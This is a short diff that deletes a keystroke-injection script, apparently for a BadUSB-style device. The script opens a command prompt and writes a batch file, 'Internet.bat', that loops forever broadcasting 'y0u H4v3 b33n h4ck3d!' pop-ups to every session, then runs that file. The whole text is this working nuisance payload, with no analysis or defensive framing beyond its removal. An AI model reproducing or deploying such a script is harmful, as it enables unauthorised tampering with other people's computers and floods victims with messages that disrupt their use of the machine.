@@ -1,9 +1,0 @@
-DefaultDelay:2000
-CustomDelay:5000
-Press:131+114
-PrintLine:cmd
-PrintLine:echo :start>>Internet.bat
-PrintLine:echo msg * y0u H4v3 b33n h4ck3d!>>Internet.bat
-PrintLine:echo goto start>>Internet.bat
-PrintLine:Internet.bat
-Press:131+100
